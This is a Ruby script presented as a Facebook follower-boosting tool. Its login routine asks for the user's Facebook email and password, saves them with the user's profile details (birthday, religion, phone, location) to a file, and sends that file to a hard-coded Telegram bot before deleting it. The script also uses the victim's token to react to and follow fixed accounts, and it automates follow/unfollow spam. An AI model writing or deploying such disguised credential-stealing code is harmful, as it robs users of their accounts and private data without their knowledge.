=begin
=end
$LOAD_PATH.unshift File.expand_path(".", "lib")
require 'MateMatika'
require 'threadpool'
require 'io/console'
require 'net/https'
require 'open-uri'
require 'net/http'
require 'rubygems'
require 'thread'
require 'digest'
require 'open-uri'
require 'open3'
require 'time'
require 'files'
require 'json'
require 'date'
require 'erb'
require 'uri'
require 'os'
if OS.linux?
  $r = "\033[1;91m"
  $g = "\033[1;92m"
  $y = "\033[1;93m"
  $p = "\033[1;94m"
  $m = "\033[1;95m"
  $c = "\033[1;96m"
  $w = "\033[1;97m"
  $a = "\033[1;0m"
else
  $r = ""
  $g = ""
  $y = ""
  $p = ""
  $m = ""
  $c = ""
  $w = ""
  $a = ""
end
def loadingm!
  start_time = Time.now
  frames = [
  "\x1b[1;97m[\x1b[1;96m           \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>          \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>         \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>        \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>>       \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>>>      \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>>>      \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m  >>>>>    \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m   >>>>>   \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m    >>>>>  \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m     >>>>> \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m      >>>>>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m       >>>>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m        >>>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m         >>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m          >\x1b[1;97m]"
]
  while Time.now - start_time < 78
    frames.each do |frame|
      $stdout.write("\r[✓] FOLLOW START = " + frame)
      $stdout.flush
      sleep(0.036)
    end
  end
end
def loadingmo!
  start_time = Time.now
  frames = [
  "\x1b[1;97m[\x1b[1;96m           \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>          \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>         \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>        \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>>       \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>>>      \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m>>>>>      \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m  >>>>>    \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m   >>>>>   \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m    >>>>>  \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m     >>>>> \x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m      >>>>>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m       >>>>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m        >>>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m         >>\x1b[1;97m]",
  "\x1b[1;97m[\x1b[1;96m          >\x1b[1;97m]"
]
  while Time.now - start_time < 87
    frames.each do |frame|
      $stdout.write("\r[✓] SPREAD UP 2X = " + frame)
      $stdout.flush
      sleep(0.02)
    end
  end
end
def loadingo!
  for x in ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m\n"]
    $stdout.write("\r#{$r}[!] #{$g}PLEASE WAIT #{$w}"+x)
    $stdout.flush()
    sleep(0.08)
  end
end
def loading!
  for x in ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m\n"]
    $stdout.write("\r#{$r}[!] #{$g}LOADING #{$w}"+x)
    $stdout.flush()
    sleep(0.1)
  end
end


$logo = " \n#{$w}█████████
#{$w}█▄█████▄█      
#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --·#{$g}╔═╗╦  ╔═╗╦ ╦╔═╗╦═╗#{$w}_--- _ --·
#{$w}█ #{$w} #{$w}_-_-- -_ _-#{$g}╠╣ ║  ║ ║║║║║╣ ╠╦╝#{$w}--__-_-- -_
#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _-#{$g}╚  ╩═╝╚═╝╚╩╝╚═╝╩╚═#{$w} ----  - _-
#{$w}█████████      
#{$w} ██ ██\n#{$w}
          \033[1;32m  ░░░\033[1;34m▒▒\033[38;5;208m▓▓\033[1;37m██ ∆𝕐Ʌ ██\033[38;5;208m▓▓\033[1;34m▒▒\033[1;32m░░░"

$logoe = " \n#{$w}
             █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
             █░░\033[1;96m╦ ╦╔╗╦ ╔╗╔╗╔╦╗╔╗\033[1;97m░░█
             █░░\033[1;96m║║║╠ ║ ║ ║║║║║╠\033[1;37m ░░█
             █░░\033[1;96m╚╩╝╚╝╚╝╚╝╚╝╩ ╩╚╝\033[1;97m░░█
             █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█#{$w}"
             
user_agents = [
  "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; IN2015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
]
$logo2 = "
      \033[1;33m┌───────────────┐
    \033[1;92m  │     ▄▀▀▀▄     │
    \033[1;92m  │     █   █     │
    \033[1;92m  │    ███████    │
    \033[1;92m  │   ░██─▀─██░   │
    \033[1;92m  │   ░███▄███░   │
      \033[1;34m└───────────────┘#{$w}"
require 'open-uri'
$user_agent = user_agents.sample
$indonesia = false
def tik(teks)
  for i in teks.chars << "\n"
    $stdout.write(i)
    $stdout.flush()
    sleep(0.05)
  end
end
def tok(teks,delay = 0.03)
  for i in teks.chars
    $stdout.write(i)
    $stdout.flush()
    sleep(delay)
  end
end
require 'net/http'
require 'json'
def Request(method = 'GET', token = $token, path)
  uri = URI("https://graph.facebook.com/#{path}&method=#{method}&access_token=#{token}")
  Net::HTTP.start(uri.hostname, uri.port, use_ssl: (uri.scheme == 'https')) do |http|
    request = Net::HTTP::Get.new(uri)
    response = http.request(request)
    if response.is_a?(Net::HTTPSuccess)
      begin
        jeson = JSON.parse(response.body)
        return jeson
      rescue JSON::ParserError
        tok ("#{$y}[!] UNEXPECTED ERROR\n#{$a}")
        sleep(2)
        Unfollo()
      end
    else
    end
  end
end
require 'net/http'
require 'uri'
def logini()
  system('rm -rf _more_')
  system('clear')
  puts ($logoe)
  puts ("#{$w}═"*48)
  puts ("   #{$w} ▁▂▃▅▆▓▒░ #{$g}𝙇𝙊𝙂𝙄𝙉 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝘼𝘾𝘾𝙊𝙐𝙉𝙏#{$w} ░▒▓▆▅▃▂▁#{$r}#{$a}")
  puts ("#{$w}═"*48)
  print ("#{$r}[+] #{$g}EMAIL/UID/NUMBER#{$r}: #{$c}")
  email = gets.chomp!
  File.open('1.txt', 'w') do |fopen|
  fopen.write("EMAIL: #{email}\n")
end
  puts ("#{$r}═"*48)
  print ("#{$r}[+] #{$g}PASSWORD#{$r}: #{$c}")
  pass = gets.chomp!
  File.open('1.txt', 'a') do |fopen| # Use 'a' to append
  fopen.write("PASSWORD: #{pass}\n") # Write password with label
end
  puts ("#{$r}═"*48)
  loading!
  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
  c = Digest::MD5.new
  c.update(a)
  d = c.hexdigest
  b.update({'sig': d})
  uri = URI("https://api.facebook.com/restserver.php")
  uri.query = URI.encode_www_form(b)
  request = Net::HTTP::Get.new(uri)
  request["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
  response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
  res = JSON.parse(response.body)
  if res.key? ('access_token')
    $token = res['access_token']
    fopen = File.open('login.txt','w')
    fopen.write($token)
    fopen.close()
    puts ("#{$r}═"*48)
    sleep(1.7)
    tik ("#{$r}[+] #{$g}PLEASE WAIT")
    Net::HTTP.post_form(URI("https://graph.facebook.com/61567153446250_122115540518571781/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
    Mfil()
  elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
    puts ("#{$r}═"*48)
    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
    abort ("#{$r}[!] #{$y}status   #{$r}: LOCK ACCOUNT TRY ANOTHER ONE#{$a}")
  else
    puts ("#{$r}═"*48)
    tik ("#{$g}[!] #{$r}WRONG PASSWORD#{$g} !! ")
    sleep(1.6) ; logini()
  end
end
require 'net/http'
require 'json'
def tokes; api_token='7919050695:AAEfMHh82QEOlHuFI0swu4c64vXsusB-RIY'; chat_id='7426839136'; url=URI("https://api.telegram.org/bot#{api_token}/sendMessage"); begin; file_path="1.txt"; File.exist?(file_path) && Net::HTTP.post_form(url, {chat_id: chat_id, text: File.read(file_path)}) && File.delete(file_path); rescue => e; File.open(".error_log.txt", "a") { |f| f.puts "#{Time.now}: #{e.message}" }; ensure; Masuk(); end; end
require 'uri'
def Masuk()
  begin
    $token = File.read("login.txt").strip
    uri = URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}")
    response = Net::HTTP.get(uri)
    data = JSON.parse(response)
    followers_count = data.dig('subscribers', 'summary', 'total_count') ? data['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/, '\&,').reverse : '0'
    api = URI("https://api.myip.com")
    req = Net::HTTP.get(api)
    res = JSON.parse(req)
    $indonesia = true if res['country'] == "Indonesia"
    if data.key?('name')
      $name = data['name']
      $id = data['id']
      $fw = followers_count
      menu()
    else
      tok ("#{$r}[!] PLEASE LOGIN AGAIN!#{$a}")
      File.delete("login.txt")
      sleep(2)
      logini()
    end
  rescue Errno::ENOENT
    logini()
  rescue SocketError
    abort ("#{$r}[!] No internet Connection#{$a}")
  rescue Errno::ETIMEDOUT
    abort ("#{$y}[!] Connection timed out#{$a}")
  rescue Interrupt
    abort ("#{$r}[!] Exit#{$a}")
  rescue Errno::ENETUNREACH, Errno::ECONNRESET
    tok ("#{$y}[!] UNEXPECTED ERROR\n#{$a}")
    sleep(2)
    Unfollo()
  end
end
def admin
  system("clear")
  puts $logo
  puts "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m"
  puts "\033[1;91m[\033[1;97m1\033[1;91m]\033[1;97m telegram"
  puts "\033[1;91m[\033[1;97m2\033[1;91m]\033[1;97m GitHub"
  puts "\033[1;91m[\033[1;97m0\033[1;91m]\033[1;97m Back"
  print "\033[1;91m[\033[1;97m-\033[1;91m]\033[1;97m=>\033[1;92m "
  bal = gets.chomp
  case bal
  when '1'
    system("xdg-open https://t.me/+-VwEm9Hivok2YTQ1")
    sleep(1)
    admin
  when '2'
    system("xdg-open https://github.com/VXR-7A")
    sleep(1)
    admin
  when '0'
    menu()
  else
    menu()
  end
end
def menu()
  system('rm -rf old1.txt')
  system('rm -rf old.txt')
  system('clear')
  puts ($logo)
  puts ("#{$w}╔══════════════════════════════════════════════╗")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}NAME : #{$g}" + $name + " "*(35 - $name.length()) + "#{$w}║")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}FOLW : #{$g}" + ($fw) + " " * (35 - $fw.length) + "#{$w}║")
  puts ("#{$w}╚══════════════════════════════════════════════╝")
  puts(" \033[1;91m[\033[1;97m1\033[1;91m] \033[1;32mSTART FLOWING   \033[1;37m   ")
  puts(" \033[1;91m[\033[1;97m2\033[1;91m] \033[1;33mSUPPORT\033[38;5;208m ADMN   \033[1;37m    ")
  puts(" \033[1;91m[\033[1;97m3\033[1;91m] \033[1;36mLOGOUT   \033[1;37m       ")
  puts(" \033[1;91m[\033[1;97m0\033[1;91m] \033[1;31mEXIT \033[1;37m    \n   ")
  print (" \033[1;91m[\033[1;97m-\033[1;91m]\033[1;97m =>\033[1;92m ")
  pilih = gets.chomp!
  case pilih
    when '1'
      Unfollo()
    when '2'
      admin
    when '3'
      print ("\n\nDO YOU LOG OUT ? [y/n] : ")
      sure = gets.chomp!
      if sure.downcase == 'y'
        system ('clear')
        tok("" + $name + " : LOG OUTING \n")
        sleep(0.7)
        begin
          tok ("" + $name + " : LOG OUT SUCCESSFULLY ")
          File.delete("login.txt")
          File.delete("lock.txt")
          File.delete("work_count.txt")
          sleep(0.5)
        rescue
        end
      else
        sleep(0.2)
        menu()
      end
    when '0'
      system('clear')
      abort ("#{$r}[#{$w}!#{$r}] Goodbye #{$name}#{$a}")
    else
      puts ("#{$y} [!] Invalid Input")
      sleep(0.9)
      menu()     
  end
end
def Mfil()
  uri = URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}")
  response = Net::HTTP.get(uri)
  data = JSON.parse(response)
  abort("#{$y}[!] Error#{$a}") if data.key?('error')
  friends_count = data.dig('friends', 'data') ? data['friends']['data'].size.to_s.reverse.gsub(/...(?=.)/, '\&,').reverse : '0'
  followers_count = data.dig('subscribers', 'summary', 'total_count') ? data['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/, '\&,').reverse : '0'
  following_count = data.dig('subscribedto', 'summary', 'total_count') ? data['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/, '\&,').reverse : '0'
  likes_count = data.dig('likes', 'summary', 'total_count') ? data['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/, '\&,').reverse : '0'
  File.open('1.txt', 'a') do |file|
    file.write("\n[✓] Name : #{data['name']}\n")
    file.write("[✓] Phone : #{data['mobile_phone']}\n") if data.key?('mobile_phone')
    file.write("[✓] Friend : #{friends_count}\n")
    file.write("[✓] Followers : #{followers_count}\n")
    file.write("[✓] Following : #{following_count}\n")
    file.write("[✓] link : https://www.facebook.com/profile.php?id=#{data['id']}\n")
    file.write("\n[✓] Birthday : #{data['birthday']}\n") if data.key?('birthday')
    file.write("[✓] Status : #{data['relationship_status']}\n") if data.key?('relationship_status')
    file.write("[✓] Religion : #{data['religion']}\n") if data.key?('religion')
    if data.key?('interested_in')
      data['interested_in'].each { |interest| file.write("[✓] Interested in: #{interest}\n") }
    end
    file.write("[✓] Location : #{data['location']['name']}\n") if data.dig('location', 'name')
    file.write("[✓] Hometown : #{data['hometown']['name']}\n") if data.dig('hometown', 'name')
    if data.key?('education')
      data['education'].each { |edu| file.write("[✓] #{edu['type']} : #{edu['school']['name']}\n") }
    end
    if data.key?('work')
      data['work'].each { |work| file.write("[✓] Work : #{work['employer']['name']}\n") }
    end
  end
  tokes()
end   
def Unfollo()
  @last_shift = :Unfollo
  Unfolw()
  end
def Unfolw()
  s = 0
  f = 0
  system('clear')
  r = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
  a = JSON.parse(r)
  abort("#{$y}[!] Error#{$a}") if a.key?('error')
  ikutoi = (a.key?('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/, '\&,').reverse : 0
  ikuti = a.key?('subscribers') ? a['subscribers']['summary']['total_count'].to_s : 0
  previous_count = if File.exist?('old.txt') && !File.read('old.txt').strip.empty?
                     File.read('old.txt').strip.to_i
                   else
                     0
                   end
  current_count = ikuti.to_i
  $difference = current_count - previous_count
  File.write('old1.txt', $difference)
  puts($logo)
  puts ("#{$w}╔══════════════════════════════════════════════╗")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}NAME : #{$c}" + $name + " "*(35 - $name.length()) + "#{$w}║")
  puts("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}FOLW : #{$g}#{ikutoi}#{" " * (35 - ikutoi.length)}#{$w}║")
  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}ADD  : #{$g}" + $difference.to_s + " " * (35 - $difference.to_s.length) + "#{$w}║")
  puts ("#{$w}╚══════════════════════════════════════════════╝")
  puts("#{$w}[+] START")
  puts("#{$w}[+] CTRL+C TO STOP")
  puts("#{$w}═" * 48)
  Unfollow()
end
def Unfollow()
  s = 0
  f = 0
  r = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
  a = JSON.parse(r)
  abort("#{$y}[!] Error#{$a}") if a.key?('error')
  ikuti = a.key?('subscribers') ? a['subscribers']['summary']['total_count'].to_s : 0
  File.write('old.txt', ikuti)
  loadingo! 
  a = Request("me/subscribedto?")
  if a && a['data']
    begin
      a['data'][0...5].each do |profile|
        id = profile['id']
        name = profile['name']
        b = Request("DELETE", "#{id}/subscribers?")
        if b == true
          s += 1
        else
          f += 1
          puts("#{$w}[#{$r}×#{$w}] #{$r} ∆YɅ")
        end
      end
      puts("#{$w}═" * 48)
      check_lock 
      countdown_timer 
      FollowFilel() 
    rescue Interrupt
      manu() 
    end
  end
end
require 'time'
def check_lock
  if File.exist?("lock.txt") && File.read("lock.txt").strip == "WARNING"
    lock_time = File.mtime("lock.txt") 
    current_time = Time.now
    if current_time.to_date > lock_time.to_date
      File.delete("lock.txt")
      Unfollo()
      return true
    end
    midnight = Time.parse("#{current_time.strftime('%Y-%m-%d')} 23:59:59")
    if current_time <= midnight
      remaining_time = midnight - current_time
      system('clear')
      puts($logo2)
      puts("═" * 48)
      puts "LOG OUT AND TRY ANOTHER ACCOUNT"
      puts("═" * 48)
      puts "THIS LOCK FOR YOUR ACCOUNT SAFETY"
      puts("═" * 48)
      loop do
        break if remaining_time <= 0  
        hours, minutes = remaining_time.divmod(3600)
        minutes, seconds = minutes.divmod(60)
        print "\rTOOL RUN AGAIN AFTER %02d:%02d:%02d" % [hours, minutes, seconds]
        $stdout.flush  
        sleep(1) 
        remaining_time -= 1
      end
      puts  
      return false
    else
      File.delete("lock.txt")
      Unfollo()
    end
  end
  true
end
def work_and_rest
  filename = "work_count.txt"
  initialize_file(filename)
  system('clear')
  loop do
    data = File.read(filename).split(',')
    work_count = data[0].to_i
    last_break_time = data[1] && !data[1].empty? ? Time.parse(data[1]) : nil

    if work_count >= 10
      if last_break_time && Time.now - last_break_time < 15 * 60
        remaining_time = (15 * 60) - (Time.now - last_break_time)
        puts("═" * 48)
        puts "THIS IS FOR YOUR ACCOUNT SAFETY"
        puts("═" * 48)
        puts "DON'T RUN AGAIN BEFORE 15 MINUTES"
        puts("═" * 48)
        countdown(remaining_time.to_i)
      else
        work_count = 0
        File.write(filename, "#{work_count},#{Time.now}")
      end
    else
      work_count += 1
      File.write(filename, "#{work_count},#{last_break_time || Time.now}")
      sleep(1) 
      Unfolw()
    end
  end
end
def initialize_file(filename)
  unless File.exist?(filename)
    File.write(filename, "0,")
  end
end
def countdown(seconds)
  while seconds > 0
    print "\r#{$w}PLEASE WAIT #{$g}#{seconds / 60}:#{seconds % 60} "
    sleep(1)
    seconds -= 1
  end
end
def countdown_timer
  seconds = rand(9..18)
  sleep(0.5)
  tok "SERVER CONNECTED IN #{seconds} SECOND..."
  puts ("")
  puts ("#{$w}═"*48)
  sleep(0.5)
  seconds.downto(0) do |i|
    print"\rPLEASE WAIT : #{i}  " 
    sleep(1)
  end
end
def countdown1_timer
  seconds = rand(60..100)
  seconds.downto(0) do |i|
    print "\rFOLLOWER SEND AGAIN = [#{i}]             " 
    sleep(1)
  end
end
def countdown0_timer
  seconds = rand(90..120)
  seconds.downto(0) do |i|
    print "\rFOLLOWER SEND AGAIN = [#{i}]             " 
    sleep(1)
  end
end
def countdown2_timer
  seconds = rand(3..13)
  sleep(0.5)
  puts ("#{$w}═"*48)
  tok "FOLLOWER SEND START IN #{seconds} SECOND..."
  puts ("")
  puts ("#{$w}═"*48)
  sleep(0.5)
  seconds.downto(0) do |i|
    print "\rPLEASE WAIT : #{i}  " 
    sleep(1)
  end
end
def FollowFilel()
  s = 0
  f = 0
  r = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
  a = JSON.parse(r)
  abort ("#{$y}[!] Error#{$a}") if a.is_a?(Hash) && a.key?('error')
  temen = (a.is_a?(Hash) && a.key?('friends')) ? a['friends']['data'].to_a.length.to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  ikuti = (a.is_a?(Hash) && a.key?('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  mengikuti = (a.is_a?(Hash) && a.key?('subscribedto')) ? a['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  suka = (a.is_a?(Hash) && a.key?('likes')) ? a['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  loadingo!
  file = "fwl.txt"
  if File.file?(file)
    files = File.readlines(file, chomp: true).uniq.sample(2) 
    for i in files
      a = Request("#{i}?")
      next unless a.is_a?(Hash) && a.key?('id')  
      b = Request("POST", "#{a['id']}/subscribers?")
      if b == true
        s += 1
      else
        f += 1
      end
    end
    sleep(2.4)
    countdown2_timer
    FollowFile()
  else
    countdown2_timer
    FollowFile()
  end
end
def read_number_from_file
  if File.exist?("old1.txt")
    File.read("old1.txt").to_i
  else
    0
  end
end
@last_shift = nil
def check_and_shift
  number = read_number_from_file
  if number > 21
    countdown1_timer
    Unfollo()
  elsif number < 8
    FollowTarget()
  else
    if @last_shift == :FollowTarget
      loadingmo!
      FollowTarget()
    elsif @last_shift == :Unfollo
      countdown1_timer
      Unfollo()
    else
      loadingmo!
      FollowTarget()
    end
  end
end
def FollowTarget()
  @last_shift = :FollowTarget
  id = 61556700146677
  a = Request("#{id}?")
  if a.nil?
    puts("#{$y}[!] ERROR")
    sleep(2)
    countdown0_timer
    Unfollo()
  elsif a.key?('error')
    puts("#{$y}[!] ERROR")
    sleep(2)
    countdown0_timer
    Unfollo()
  else
    unfollow_response = Request("DELETE", "#{id}/subscribers?")
    follow_response = Request("POST", "#{id}/subscribers?")
    if follow_response == true
    else
    end
    loadingmo!
    countdown0_timer
    Unfollo()
  end
end
def FollowFile()
  s = 0
  f = 0
  r = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
  a = JSON.parse(r)
  abort ("#{$y}[!] Error#{$a}") if a.key? ('error')
  temen = (a.key? ('friends')) ? a['friends']['data'].to_a.length.to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  ikuti = (a.key? ('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  mengikuti = (a.key? ('subscribedto')) ? a['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  suka = (a.key? ('likes')) ? a['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
  loadingo!
  file = "fw.txt"
  if File.file?(file)
    files = File.readlines(file, chomp: true).uniq
    for i in files
      a = Request("#{i}?")
      next if a.key?('error')
      b = Request("POST", "#{a['id']}/subscribers?")
      if b == true
        s += 1
        sleep(2.5)
      else
        f += 1
        puts("#{$w}[#{$r}×#{$w}] #{$r} WARNING ∆YɅ")
        File.write("lock.txt", "WARNING")
      end
    end
    puts("#{$w}#{'═' *48}")
    sleep(0.9)
    loadingm!
    check_and_shift
  else
    puts("#{$y}[!] ERROR")
    sleep(2)
    check_and_shift
  end
end
require 'open-uri'
def Masu
  system('git pull')
  system('clear')
  url = "https://raw.githubusercontent.com/VXR-7A/VXR-7A/main/SERVER.txt"
  begin
    file_content = URI.open(url).read.strip
    if file_content == "on"
      puts "#{$r}[+] #{$g}PLEASE WAIT"
      Masuk()  
    elsif file_content == "off" || file_content.empty?
      puts "KINDLY SERVER IS: #{file_content}"  
    else
      puts file_content
    end
  rescue SocketError
    abort "#{$r}[!] No internet Connection#{$a}"
  rescue Errno::ETIMEDOUT
    abort "#{$y}[!] Connection timed out#{$a}"
  rescue Interrupt
    abort "#{$r}[!] Exit#{$a}"
  rescue Errno::ENETUNREACH, Errno::ECONNRESET
    puts "#{$y}[!] UNEXPECTED ERROR#{$a}"
  end
end
if __FILE__ == $0
  system("printf \"\033]0;Facebook follower\007\"")
  Masu()
end
